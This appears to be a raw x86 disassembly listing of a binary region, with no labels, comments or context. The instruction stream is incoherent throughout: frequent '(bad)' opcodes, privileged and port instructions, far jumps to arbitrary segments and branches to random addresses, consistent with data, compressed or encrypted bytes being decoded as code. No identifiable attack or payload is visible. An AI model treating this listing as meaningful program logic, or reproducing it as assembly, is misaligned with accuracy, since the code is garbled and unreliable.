  429fb9:	or     esp,DWORD PTR [ecx]
  429fbb:	sbb    al,0xba
  429fbd:	and    al,0x3d
  429fbf:	sahf   
  429fc0:	js     0x429f9d
  429fc2:	pop    esp
  429fc3:	dec    edi
  429fc4:	nop
  429fc5:	ss mov ebx,0x7983f39
  429fcb:	add    esp,esp
  429fcd:	add    ebp,eax
  429fcf:	ret    
  429fd0:	ret    
  429fd1:	cmp    esi,DWORD PTR [esi-0x26]
  429fd4:	adc    esi,esi
  429fd6:	inc    ebp
  429fd7:	or     bh,BYTE PTR [eax+0x39a63eff]
  429fdd:	sub    ah,BYTE PTR [ebx+0x1d4ce398]
  429fe3:	loop   0x42a05e
  429fe5:	jo     0x429f77
  429fe7:	rcl    BYTE PTR [esi+eax*1],cl
  429fea:	lods   al,BYTE PTR ds:[esi]
  429feb:	mov    dh,0xc3
  429fed:	aas    
  429fee:	imul   ecx,DWORD PTR [ebx],0xffffff97
  429ff1:	jae    0x42a020
  429ff3:	xchg   esp,eax
  429ff4:	jl     0x429f9b
  429ff6:	dec    ebx
  429ff7:	adc    edx,edi
  429ff9:	leave  
  429ffa:	mov    ds:0x436cc7cf,eax
  429fff:	lods   al,BYTE PTR ds:[esi]
  42a000:	xor    bh,ah
  42a002:	xchg   cl,cl
  42a004:	(bad)  
  42a005:	enter  0x57fd,0x5e
  42a009:	jae    0x429fb5
  42a00b:	jle    0x42a014
  42a00d:	mov    dl,0xda
  42a00f:	(bad)  
  42a010:	adc    DWORD PTR [esi-0x51],esp
  42a013:	les    esi,FWORD PTR [edx-0x47]
  42a016:	inc    DWORD PTR [eax*8+0x63b865f8]
  42a01d:	jb     0x42a059
  42a01f:	adc    ebp,0x6e32bd81
  42a025:	cmc    
  42a026:	cmp    DWORD PTR [ecx-0x44],0xb42d0b1e
  42a02d:	inc    ebp
  42a02e:	lods   al,BYTE PTR ds:[esi]
  42a02f:	pop    edi
  42a030:	sbb    BYTE PTR [edi],cl
  42a032:	cdq    
  42a033:	rcl    esi,1
  42a035:	repz pushf 
  42a037:	sbb    DWORD PTR [ebp-0x72],ebp
  42a03a:	mov    dl,0xcd
  42a03c:	icebp  
  42a03d:	call   0x5da1:0x387a9431
  42a044:	cmp    BYTE PTR ds:[ebx-0x233d771b],bl
  42a04b:	out    0xe4,eax
  42a04d:	jg     0x42a037
  42a04f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a050:	cli    
  42a051:	adc    eax,0x45c4f388
  42a056:	ins    BYTE PTR es:[edi],dx
  42a057:	stos   BYTE PTR es:[edi],al
  42a058:	fdiv   QWORD PTR [eax-0x205ce580]
  42a05e:	inc    esi
  42a05f:	sub    BYTE PTR [ebx+0x1f4c5d69],ch
  42a065:	imul   edi,DWORD PTR [ecx],0xfffffff5
  42a068:	jnp    0x42a0e6
  42a06a:	bound  ebp,QWORD PTR [edx+0x5b]
  42a06d:	adc    al,0xa5
  42a06f:	pop    ss
  42a070:	hlt    
  42a071:	push   cs
  42a072:	ret    0x6111
  42a075:	shl    DWORD PTR [ebx+eax*1],0x56
  42a079:	mov    ecx,DWORD PTR [ebx-0x7acfdb8d]
  42a07f:	(bad)  [ebp-0x2e]
  42a082:	popa   
  42a083:	icebp  
  42a084:	sub    BYTE PTR [edi+0x73c3b380],al
  42a08a:	stc    
  42a08b:	adc    eax,0xbcc2c067
  42a090:	dec    edi
	...
  42a0f1:	add    BYTE PTR [eax],al
  42a0f3:	add    bh,dl
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	cld    
  42a101:	pop    ss
  42a102:	cmp    edi,DWORD PTR [edx]
  42a104:	js     0x42a0c8
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    eax,0xe3000001
  42a10d:	(bad)  
  42a10f:	arpl   WORD PTR [edx+0x66de075a],bx
  42a115:	hlt    
  42a116:	sub    bl,BYTE PTR [esi]
  42a118:	retf   
  42a119:	ss mov esi,0xeaf04186
  42a11f:	cli    
  42a120:	shl    BYTE PTR [esi],cl
  42a122:	lock sub BYTE PTR [ecx+0x5d6b68b7],dl
  42a129:	arpl   WORD PTR [edi+0x6],bp
  42a12c:	inc    ebx
  42a12d:	imul   edx,esp,0x3746732d
  42a133:	or     eax,0xeb0239ca
  42a138:	(bad)  
  42a139:	aas    
  42a13a:	pop    eax
  42a13b:	jle    0x42a108
  42a13d:	cwde   
  42a13e:	pop    ebx
  42a13f:	icebp  
  42a140:	inc    edx
  42a141:	mov    fs,WORD PTR [ebp-0x49ac25bd]
  42a147:	jne    0x42a1b2
  42a149:	mov    bh,0x88
  42a14b:	outs   dx,BYTE PTR cs:[esi]
  42a14d:	xor    eax,0xebb26c4f
  42a152:	and    dh,BYTE PTR [ecx-0x91fedde]
  42a158:	adc    eax,0x3b5023fc
  42a15d:	xchg   edi,eax
  42a15e:	xor    eax,0xfbe8b6d8
  42a163:	dec    esp
  42a164:	mov    ebx,0xb0699ea0
  42a169:	enter  0xe23b,0xdc
  42a16d:	pop    ds
  42a16e:	mov    edx,0xec2a98e4
  42a173:	jle    0x42a158
  42a175:	lea    edx,[edi+0x133b6e1f]
  42a17b:	jecxz  0x42a168
  42a17d:	cmp    eax,0x50a72976
  42a182:	(bad)  
  42a184:	add    DWORD PTR [eax+0x57],edx
  42a187:	pop    es
  42a188:	psrld  mm3,QWORD PTR gs:[esi]
  42a18c:	iret   
  42a18d:	rcr    BYTE PTR [ebp+0x3f82c3e9],cl
  42a193:	lds    edx,FWORD PTR [edx+0x4b1964bc]
  42a199:	aaa    
  42a19a:	pop    ebx
  42a19b:	(bad)
  42a19f:	mov    dl,ah
  42a1a1:	in     ax,0x19
  42a1a4:	lock mov bl,BYTE PTR [edx]
  42a1a7:	or     bh,bl
  42a1a9:	bound  ecx,QWORD PTR [edi-0x15]
  42a1ac:	and    DWORD PTR ds:0xd84007aa,ebx
  42a1b2:	outs   dx,BYTE PTR ds:[esi]
  42a1b3:	aaa    
  42a1b4:	shl    DWORD PTR [edi],cl
  42a1b6:	int    0x11
  42a1b8:	dec    eax
  42a1b9:	pop    eax
  42a1ba:	(bad)  
  42a1bb:	cmp    eax,0xfb9cabba
  42a1c0:	js     0xba5e7c1d
  42a1c6:	mov    dl,BYTE PTR [ebp+0x8d21ac5]
  42a1cc:	stc    
  42a1cd:	scas   al,BYTE PTR es:[edi]
  42a1ce:	cmp    DWORD PTR [eax+0x6c],edi
  42a1d1:	mov    al,0x48
  42a1d3:	or     BYTE PTR [eax],0xfd
  42a1d6:	lds    eax,FWORD PTR [ebx-0x4c]
  42a1d9:	imul   ecx,DWORD PTR [ecx+0x624796fa],0x7355bae
  42a1e3:	pusha  
  42a1e4:	inc    ebx
  42a1e5:	bound  esi,QWORD PTR [esi+0x10]
  42a1e8:	mov    bl,BYTE PTR ds:0xb9e64e94
  42a1ee:	inc    ebx
  42a1ef:	clc    
  42a1f0:	adc    DWORD PTR [ebx-0x12775c1c],0x60
  42a1f7:	adc    al,0x31
  42a1f9:	jo     0x42a241
  42a1fb:	inc    ebp
  42a1fc:	ds xchg esp,eax
  42a1fe:	pop    ecx
  42a1ff:	int3   
  42a200:	mov    al,0x93
  42a202:	and    ebx,DWORD PTR [edi-0x6c]
  42a205:	ins    BYTE PTR es:[edi],dx
  42a206:	imul   ebx,eax,0x227568dc
  42a20c:	retf   
  42a20d:	push   0x1e
  42a20f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a210:	ret    0x0
	...
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fld    st(7)
  42a281:	inc    esp
  42a282:	xchg   edx,eax
  42a283:	loop   0x42a302
  42a285:	ret    
  42a286:	add    DWORD PTR [eax],eax
  42a288:	add    eax,0xf7000001
  42a28d:	mov    cl,0x81
  42a28f:	pop    ds
  42a290:	cmc    
  42a291:	gs (bad) 
  42a293:	cld    
  42a294:	push   ds
  42a295:	pop    ecx
  42a296:	inc    esi
  42a297:	in     al,dx
  42a298:	mov    ds:0xf9ba63a0,al
  42a29d:	dec    ecx
  42a29e:	xor    al,0x2b
  42a2a0:	aam    0x14
  42a2a2:	iret   
  42a2a3:	inc    esi
  42a2a4:	imul   esi,DWORD PTR [ebx],0xd9905439
  42a2aa:	xchg   esi,eax
  42a2ab:	inc    eax
  42a2ac:	ficomp WORD PTR [esi+0x540aaa61]
  42a2b2:	mov    al,ds:0x9e2a741f
  42a2b7:	les    edi,FWORD PTR [ecx]
  42a2b9:	retf   0x5796
  42a2bc:	push   cs
  42a2bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a2be:	and    BYTE PTR [ecx+eax*4-0x1a25997e],0x15
  42a2c6:	popf   
  42a2c7:	add    bh,0x72
  42a2ca:	mov    cl,0x5f
  42a2cc:	adc    BYTE PTR [ebx],ah
  42a2ce:	mov    edi,0x91c4ddcb
  42a2d3:	and    eax,0xb6902ec1
  42a2d8:	inc    esi
  42a2d9:	lods   eax,DWORD PTR ds:[esi]
  42a2da:	into   
  42a2db:	int    0x80
  42a2dd:	mov    esi,0x801a2677
  42a2e2:	(bad)  [eax]
  42a2e4:	ds xchg ebp,eax
  42a2e6:	(bad)  
  42a2e7:	test   esp,0x2b2abfce
  42a2ed:	mov    al,ds:0x434b6bdf
  42a2f2:	fbstp  TBYTE PTR [esi-0x45]
  42a2f5:	xchg   edx,eax
  42a2f6:	adc    DWORD PTR [eax+0x5485ea4],eax
  42a2fc:	jl     0x42a2cb
  42a2fe:	push   cs
  42a2ff:	dec    edx
  42a300:	mov    esi,0xf8a4d622
  42a305:	jmp    0x298e0ab0
  42a30a:	hlt    
  42a30b:	mov    ecx,DWORD PTR [edi]
  42a30d:	push   esp
  42a30e:	std    
  42a30f:	mov    eax,0xd388b4fb
  42a314:	push   es
  42a315:	sbb    DWORD PTR [eax-0x27],edi
  42a318:	mov    BYTE PTR ds:0x52fbc93e,dh
  42a31e:	inc    esi
  42a31f:	mov    WORD PTR [ebx+edx*1+0x62],es
  42a323:	aad    0x37
  42a325:	jmp    0x87f9:0x253ae557
  42a32c:	ss sub al,0xe5
  42a32f:	shl    DWORD PTR [ecx+0x17],0xf1
  42a333:	in     eax,dx
  42a334:	ins    BYTE PTR es:[edi],dx
  42a335:	ja     0x42a356
  42a337:	cwde   
  42a338:	cmp    DWORD PTR [esi-0x2b],esi
  42a33b:	push   0x75939f7c
  42a340:	scas   al,BYTE PTR es:[edi]
  42a341:	mov    dl,BYTE PTR [edi]
  42a343:	pushf  
  42a344:	xchg   esp,eax
  42a345:	add    DWORD PTR [edx+0x52166521],esi
  42a34b:	dec    ebx
  42a34c:	xchg   ebp,eax
  42a34d:	push   0x5df2c44d
  42a352:	fxch   st(2)
  42a354:	cmp    BYTE PTR [edx-0x7a],bh
  42a357:	rcl    BYTE PTR [ecx-0x65],1
  42a35a:	fstp   DWORD PTR [edx-0x54]
  42a35d:	(bad)  
  42a35e:	pop    esi
  42a35f:	fist   DWORD PTR [ecx+0x45]
  42a362:	pusha  
  42a363:	and    edx,DWORD PTR ss:[edx+ebp*4-0x1a74fd00]
  42a36b:	xlat   BYTE PTR ds:[ebx]
  42a36c:	or     eax,0xdc965231
  42a371:	push   eax
  42a372:	add    BYTE PTR [ebx+ebx*2+0x557de16e],cl
  42a379:	sub    bl,BYTE PTR [eax]
  42a37b:	call   0xd049b46e
  42a380:	int    0x32
  42a382:	cmc    
  42a383:	cmp    DWORD PTR [eax+0x4a],ebp
  42a386:	das    
  42a387:	jecxz  0x42a385
  42a389:	sub    al,0xc2
  42a38b:	cmp    ah,BYTE PTR [esi-0x3cc9fbc]
	...
  42a3f1:	add    BYTE PTR [eax],al
  42a3f3:	add    BYTE PTR [edi+0xe],bh
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0xed0ce63d
  42a403:	in     al,dx
  42a404:	add    ah,0x1
  42a407:	add    BYTE PTR ds:0x27000001,al
  42a40d:	cmp    eax,0x18c3a04f
  42a412:	adc    cl,BYTE PTR [esi+0x52fe18c6]
  42a418:	jg     0x42a45c
  42a41a:	mov    ah,0x3c
  42a41c:	sub    bh,BYTE PTR [edx-0x52]
  42a41f:	in     eax,dx
  42a420:	psrad  mm5,QWORD PTR [ebp+ebp*4-0x74]
  42a425:	push   esp
  42a426:	call   0xa8330691
  42a42b:	repz xor esp,DWORD PTR [edi+0x25]
  42a42f:	popf   
  42a430:	les    ebx,FWORD PTR [edi+0xb]
  42a433:	leave  
  42a434:	cmovge ebp,DWORD PTR [edi+ecx*4+0x7d3e5230]
  42a43c:	loopne 0x42a4b1
  42a43e:	rcr    DWORD PTR [ebx+0x70],1
  42a441:	ret    0x1293
  42a444:	and    al,0x5a
  42a446:	js     0x42a47d
  42a448:	and    al,0xd8
  42a44a:	in     eax,0x6f
  42a44c:	and    DWORD PTR [ecx+edx*2+0x383259a],ecx
  42a453:	ss push ebp
  42a455:	ret    
  42a456:	pop    ecx
  42a457:	div    BYTE PTR [edi]
  42a459:	jo     0x42a471
  42a45b:	jne    0x42a429
  42a45d:	dec    esp
  42a45e:	add    BYTE PTR [eax-0x57],al
  42a461:	dec    esp
  42a462:	stos   DWORD PTR es:[edi],eax
  42a463:	ret    0xa63d
  42a466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a467:	mov    ds:0x1b4d49a7,al
  42a46c:	add    al,BYTE PTR [esi]
  42a46e:	nop
  42a46f:	jo     0x42a45b
  42a471:	push   ds
  42a472:	jne    0x42a3fb
  42a474:	shl    DWORD PTR [ebp+0x3c40bca3],0x91
  42a47b:	addr16 mov esp,ebp
  42a47e:	mov    dl,bl
  42a480:	xor    eax,0xa33ca7f4
  42a485:	push   esi
  42a486:	lahf   
  42a487:	test   eax,0xe37a069c
  42a48c:	cmp    DWORD PTR [edi-0x60e52cb4],ebx
  42a492:	cld    
  42a493:	stos   DWORD PTR es:[edi],eax
  42a494:	cmp    al,0x3a
  42a496:	(bad)  
  42a497:	cwde   
  42a498:	and    esp,edi
  42a49a:	jecxz  0x42a41f
  42a49c:	iret   
  42a49d:	mov    ecx,0x47f5391
  42a4a2:	aaa    
  42a4a3:	pop    ecx
  42a4a4:	adc    al,0x94
  42a4a6:	ja     0x42a458
  42a4a8:	test   DWORD PTR [ebx],edx
  42a4aa:	retf   0x190c
  42a4ad:	lods   eax,DWORD PTR ds:[esi]
  42a4ae:	add    al,0x13
  42a4b0:	int3   
  42a4b1:	sar    DWORD PTR [edi+0xf],0x4e
  42a4b5:	and    BYTE PTR [ecx],cl
  42a4b7:	pusha  
  42a4b8:	nop
  42a4b9:	dec    esp
  42a4ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a4bb:	and    eax,0x948c7abb
  42a4c0:	shr    DWORD PTR [edi-0x71],cl
  42a4c3:	stos   DWORD PTR es:[edi],eax
  42a4c4:	cmp    al,0x93
  42a4c6:	mov    al,0x85
  42a4c8:	jmp    0x3731:0x7401d005
  42a4cf:	mov    cl,0xf2
  42a4d1:	jmp    0x42a541
  42a4d3:	rol    BYTE PTR [edi+0x34],1
  42a4d6:	jmp    0x42a525
  42a4d8:	in     eax,dx
  42a4d9:	std    
  42a4da:	jmp    0x9d76e897
  42a4df:	mov    BYTE PTR [ebx-0x4b4727e9],ch
  42a4e5:	mov    edi,0x41305a87
  42a4ea:	mov    esi,0x41ece0bb
  42a4ef:	jp     0x42a561
  42a4f1:	dec    eax
  42a4f2:	dec    ebx
  42a4f3:	fistp  QWORD PTR [ecx+edi*8]
  42a4f6:	rcl    BYTE PTR [edi+0x54],0x60
  42a4fa:	sahf   
  42a4fb:	jb     0x42a52d
  42a4fd:	(bad)
  42a501:	mov    bl,0x42
  42a503:	sahf   
  42a504:	sbb    BYTE PTR [edi+ebp*2+0x74],al
  42a508:	iret   
  42a509:	push   esi
  42a50a:	cmp    DWORD PTR ss:[ebx+0x5e0aceae],ebp
	...
  42a571:	add    BYTE PTR [eax],al
  42a573:	add    BYTE PTR [eax],bl
  42a575:	dec    edi
  42a576:	pop    ss
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x46fc7d9f
  42a583:	scas   eax,DWORD PTR es:[edi]
  42a584:	xchg   ebp,eax
  42a586:	add    DWORD PTR [eax],eax
  42a588:	add    eax,0x79000001
  42a58d:	mov    db3,edx
  42a590:	ins    DWORD PTR es:[edi],dx
  42a591:	push   es
  42a592:	cmc    
  42a593:	popa   
  42a594:	outs   dx,DWORD PTR ds:[esi]
  42a595:	cmp    al,0xcf
  42a597:	mov    eax,ebp
  42a599:	pop    ebp
  42a59a:	je     0x42a596
  42a59c:	cmc    
  42a59d:	rol    DWORD PTR [esi-0x60639908],0x5f
  42a5a4:	and    dh,BYTE PTR [esi-0x4c5ab2f4]
  42a5aa:	and    DWORD PTR ds:0x57eab291,esp
  42a5b0:	mov    DWORD PTR [ebx-0x79],edx
  42a5b3:	aad    0x78
  42a5b5:	adc    cl,BYTE PTR [ebp+eiz*8-0x30debd0c]
  42a5bc:	push   0xda5b69e0
  42a5c1:	mov    esi,0x6467cfa1
  42a5c6:	cs and al,0x74
  42a5c9:	jns    0x42a5c8
  42a5cb:	bound  ebx,QWORD PTR [edi+ecx*4+0x4d]
  42a5cf:	xor    al,0x95
  42a5d1:	push   0x9676abd1
  42a5d6:	dec    edx
  42a5d7:	les    ecx,FWORD PTR [ebx*1+0x7d85f731]
  42a5de:	(bad)  
  42a5df:	stos   DWORD PTR es:[edi],eax
  42a5e0:	jmp    0x42a5dc
  42a5e2:	aad    0xed
  42a5e4:	lock rol DWORD PTR [ebx],cl
  42a5e7:	rol    DWORD PTR [eax-0x3addbeaa],1
  42a5ed:	out    dx,eax
  42a5ee:	shl    BYTE PTR [esi],1
  42a5f0:	cmp    DWORD PTR [edi-0x305d582e],edx
  42a5f6:	test   eax,0x337a11bd
  42a5fb:	fwait
  42a5fc:	push   0xffffffd4
  42a5fe:	test   eax,0x6cd1e683
  42a603:	xchg   ebp,eax
  42a604:	mov    ds:0xbf678fb0,eax
  42a609:	popf   
  42a60a:	or     DWORD PTR [esi+0x5491c542],edx
  42a610:	inc    eax
  42a611:	scas   eax,DWORD PTR es:[edi]
  42a612:	ret    0x3ce4
  42a615:	ret    
  42a616:	imul   esp,ebp,0x3b4291b7
  42a61c:	pop    esp
  42a61d:	xchg   edx,eax
  42a61e:	int3   
  42a61f:	mov    ds:0x7e5080c,al
  42a624:	and    al,BYTE PTR [ecx+esi*2]
  42a627:	pop    edx
  42a628:	mov    eax,ds:0x1af83ef
  42a62d:	pop    edx
  42a62e:	inc    edi
  42a62f:	test   BYTE PTR [eax+0x7eb9c5bc],cl
  42a635:	jb     0x42a5ef
  42a637:	inc    esp
  42a638:	les    ebp,FWORD PTR [eax+0xf]
  42a63b:	shr    BYTE PTR [esi],1
  42a63d:	ds nop
  42a63f:	nop
  42a640:	push   ebx
  42a641:	icebp  
  42a642:	sbb    eax,0xb23ff159
  42a647:	jecxz  0x42a601
  42a649:	scas   al,BYTE PTR es:[edi]
  42a64a:	sbb    BYTE PTR [eax],bh
  42a64c:	mov    al,0x73
  42a64e:	dec    ecx
  42a64f:	and    al,0x3e
  42a651:	adc    al,ah
  42a653:	mov    ah,0x9
  42a655:	sub    ah,BYTE PTR ss:[edi]
  42a658:	and    BYTE PTR [edi+0x2180169a],bh
  42a65e:	retf   
  42a65f:	pop    ebx
  42a660:	dec    edx
  42a661:	or     eax,DWORD PTR [edx-0x54]
  42a664:	mov    ecx,gs
  42a666:	xchg   esp,eax
  42a667:	xchg   ebp,eax
  42a668:	mov    BYTE PTR [ecx+0x3b9aaef0],al
  42a66e:	icebp  
  42a66f:	(bad)  
  42a670:	or     BYTE PTR [ebx-0x56],bh
  42a673:	add    eax,0xad9b469
  42a678:	xor    DWORD PTR ds:0x75cd08a4,esi
  42a67e:	add    al,0x96
  42a680:	(bad)  
  42a681:	fcmove st,st(3)
  42a683:	mov    edi,0xcac11b19
  42a688:	lock mov dh,0xb9
  42a68b:	jl     0x42a621
  42a68d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a68e:	aas    
  42a68f:	mov    esp,DWORD PTR [ebx+0x0]
	...
  42a6f1:	add    BYTE PTR [eax],al
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x5e47ece4],0x8c0466ff
  42a705:	mov    BYTE PTR [ecx],0x0
  42a708:	add    eax,0xb8000001
  42a70d:	pushf  
  42a70e:	stc    
  42a70f:	out    dx,eax
  42a710:	inc    ebp
  42a711:	add    eax,0x661cb886
  42a716:	mov    ebp,0x35e34ea3
  42a71b:	and    bh,BYTE PTR [ebp-0x12ac65cc]
  42a721:	test   BYTE PTR [edi-0x3d425101],dh
  42a727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a728:	dec    ebp
  42a729:	scas   al,BYTE PTR es:[edi]
  42a72a:	hlt    
  42a72b:	pop    ss
  42a72c:	ds sbb al,0xf8
  42a72f:	rcl    DWORD PTR [edx-0x63],cl
  42a732:	add    esp,DWORD PTR [esi]
  42a734:	sub    eax,DWORD PTR [edx-0x2a056f86]
  42a73a:	mov    dl,0x70
  42a73c:	xchg   ecx,eax
  42a73d:	mov    WORD PTR [ebx],es
  42a73f:	inc    eax
  42a740:	or     BYTE PTR [esi],ah
  42a742:	clc    
  42a743:	popa   
  42a744:	div    ch
  42a746:	xchg   BYTE PTR [esi],dh
  42a748:	pop    ds
  42a749:	dec    eax
  42a74a:	mov    esi,0xaf75c03b
  42a74f:	mov    esp,0x9cf95bc8
  42a754:	pop    esi
  42a755:	sti    
  42a756:	mov    bh,0x25
  42a758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a759:	jle    0x42a79c
  42a75b:	jl     0x42a6f3
  42a75d:	int    0x4
  42a75f:	mov    edi,?
  42a761:	sub    ch,BYTE PTR [ebp+0x15]
  42a764:	push   eax
  42a765:	(bad)  
  42a766:	repz pop ebx
  42a768:	les    ebp,FWORD PTR gs:[eax+0x65]
  42a76c:	sub    edi,DWORD PTR [ebx-0x6d]
  42a76f:	sbb    dh,dh
  42a771:	aas    
  42a772:	sbb    al,0x6c
  42a774:	cmp    al,0x48
  42a776:	repz ficomp DWORD PTR [esi]
  42a779:	int3   
  42a77a:	add    eax,0xcb7d7048
  42a77f:	fcom   DWORD PTR [eax-0x3b]
  42a782:	and    BYTE PTR [ecx+0x66],dh
  42a785:	dec    edi
  42a786:	dec    eax
  42a787:	push   ebp
  42a788:	and    eax,0x60b1bbde
  42a78d:	add    BYTE PTR [ebx+0x6a],al
  42a790:	es popf 
  42a792:	and    ah,bh
  42a794:	inc    ecx
  42a795:	fwait
  42a796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a797:	push   0x7e2de0e2
  42a79c:	jmp    0x42a733
  42a79e:	mov    esp,0xb6eb3e3
  42a7a3:	enter  0xfd66,0x75
  42a7a7:	out    0xde,al
  42a7a9:	into   
  42a7aa:	loopne 0x42a7d4
  42a7ac:	push   0x3ffa024f
  42a7b1:	mov    ds:0x88fe8127,eax
  42a7b6:	jle    0x42a760
  42a7b8:	rcl    DWORD PTR es:[eax-0x18],0xfc
  42a7bd:	xor    eax,0xd3d13083
  42a7c2:	aam    0xf5
  42a7c4:	rcl    ebp,0xd1
  42a7c7:	cmp    al,0xe4
  42a7c9:	jne    0x42a7b8
  42a7cb:	sbb    eax,0xc00a06fd
  42a7d0:	xchg   edi,eax
  42a7d1:	push   edx
  42a7d2:	pop    ebp
  42a7d3:	adc    al,0x90
  42a7d5:	fistp  WORD PTR [edi-0x73]
  42a7d8:	or     eax,0x1627418d
  42a7dd:	sub    BYTE PTR ds:0xba04040c,dl
  42a7e3:	mov    ch,0x40
  42a7e5:	push   es
  42a7e6:	das    
  42a7e7:	fisub  DWORD PTR [ebp+0x3a]
  42a7ea:	out    0xb9,eax
  42a7ec:	or     BYTE PTR [esi+0xd7010d0],dl
  42a7f2:	pop    ds
  42a7f3:	ds adc al,0xba
  42a7f6:	(bad)  
  42a7f8:	cwde   
  42a7f9:	mov    eax,0xf9c6d5ad
  42a7fe:	(bad)  
  42a7ff:	and    eax,0x304380ae
  42a804:	jmp    0x71fad715
  42a809:	inc    DWORD PTR [esi+0x27929443]
  42a80f:	scas   eax,DWORD PTR es:[edi]
  42a810:	pop    es
	...
  42a871:	add    BYTE PTR [eax],al
  42a873:	add    BYTE PTR [edx-0x10409c9b],cl
  42a879:	mov    edi,0xc58175de
  42a87e:	xchg   edi,eax
  42a87f:	ins    BYTE PTR es:[edi],dx
  42a880:	sti    
  42a881:	xchg   BYTE PTR [eax+0x1c79199],bl
  42a887:	add    BYTE PTR ds:0x2b000001,al
  42a88d:	dec    eax
  42a88e:	enter  0xf30b,0x6f
  42a892:	push   es
  42a893:	jbe    0x42a82d
  42a895:	sbb    dl,BYTE PTR [ebx]
  42a897:	cwde   
  42a898:	clc    
  42a899:	mov    DWORD PTR [ecx],ebx
  42a89b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a89c:	push   ebx
  42a89d:	push   ecx
  42a89e:	into   
  42a89f:	lods   eax,DWORD PTR ds:[esi]
  42a8a0:	das    
  42a8a1:	xchg   edi,eax
  42a8a2:	dec    esi
  42a8a3:	es push es
  42a8a5:	cmp    bl,al
  42a8a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a8a8:	jmp    0x42a8fb
  42a8aa:	test   DWORD PTR [eax+0x63abcc87],esp
  42a8b0:	and    cl,dh
  42a8b2:	into   
  42a8b3:	aaa    
  42a8b4:	pusha  
  42a8b5:	pop    ebp
  42a8b6:	sub    BYTE PTR [eax],0x46
  42a8b9:	(bad)  
  42a8ba:	sbb    DWORD PTR [ebx+0x59d06eb],eax
  42a8c0:	push   ecx
  42a8c1:	and    DWORD PTR [esi-0x16],0x446dcbe1
  42a8c8:	(bad)  
  42a8c9:	aaa    
  42a8ca:	int    0x33
  42a8cc:	add    BYTE PTR [esi+0x1e],ch
  42a8cf:	bnd call 0x49ef008e
  42a8d5:	push   edx
  42a8d6:	xchg   esi,eax
  42a8d7:	push   ecx
  42a8d8:	cwde   
  42a8d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a8da:	mov    edi,0xb7d6dd52
  42a8df:	xor    ebp,DWORD PTR [edx+ecx*1-0x2]
  42a8e3:	pop    ds
  42a8e4:	or     DWORD PTR [edx-0x6c],esp
  42a8e7:	shr    BYTE PTR [esi-0x25521ee6],0xd0
  42a8ee:	int3   
  42a8ef:	sub    ah,BYTE PTR [edx]
  42a8f1:	(bad)  
  42a8f2:	bound  ebx,QWORD PTR [ebx]
  42a8f4:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  42a8f6:	push   ds
  42a8f7:	xchg   ebx,eax
  42a8f8:	iret   
  42a8f9:	int3   
  42a8fa:	mov    DWORD PTR [eax],edx
  42a8fc:	sub    BYTE PTR [eax],dl
  42a8fe:	push   ebp
  42a8ff:	rol    BYTE PTR [esi+0x3884fe13],cl
  42a905:	mov    BYTE PTR [eax+0x64],dh
  42a908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a909:	scas   eax,DWORD PTR es:[edi]
  42a90a:	adc    BYTE PTR [edi+0x23f5c9d2],cl
  42a910:	mov    ds:0xfd421d21,eax
  42a915:	mov    ch,0xb
  42a917:	xchg   ebp,eax
  42a918:	dec    ecx
  42a919:	push   ebx
  42a91a:	mov    bl,0x35
  42a91c:	shl    BYTE PTR [eax-0x87cc0c0],0x62
  42a923:	sub    al,0xef
  42a925:	idiv   WORD PTR ds:0xb0a3dbb2
  42a92c:	out    dx,eax
  42a92d:	sub    DWORD PTR [ebx],0x72
  42a930:	mov    al,ds:0xd35b0df1
  42a935:	bound  eax,QWORD PTR [edx+ecx*4+0x62]
  42a939:	xlat   BYTE PTR ds:[ebx]
  42a93a:	fdiv   st(1),st
  42a93c:	stc    
  42a93d:	ret    0xdb99
  42a940:	lods   al,BYTE PTR ds:[esi]
  42a941:	push   esp
  42a942:	pop    ebp
  42a943:	and    BYTE PTR [ecx-0x11b3dbf6],bl
  42a949:	cmp    al,0xc9
  42a94b:	cmp    DWORD PTR [eax],esi
  42a94d:	push   eax
  42a94e:	ss xor esi,ebx
  42a951:	and    ah,BYTE PTR [eax]
  42a953:	mov    BYTE PTR [eax-0x4],bh
  42a956:	push   0xdda30561
  42a95b:	js     0x42a958
  42a95d:	or     al,0x22
  42a95f:	int3   
  42a960:	test   edi,0xfd368967
  42a966:	mov    bl,0x24
  42a968:	fld    st(1)
  42a96a:	(bad)  
  42a96b:	retf   0xeb7c
  42a96e:	stc    
  42a96f:	mov    al,ds:0xa219230b
  42a974:	daa    
  42a975:	in     al,dx
  42a976:	rcr    BYTE PTR [edx+0x2873234b],1
  42a97c:	test   al,0x84
  42a97e:	cmp    DWORD PTR [ecx],0x70
  42a981:	jb     0x42a919
  42a983:	fld    QWORD PTR [edi-0x2355289d]
  42a989:	xchg   esp,eax
  42a98a:	mov    eax,0xeaf9b101
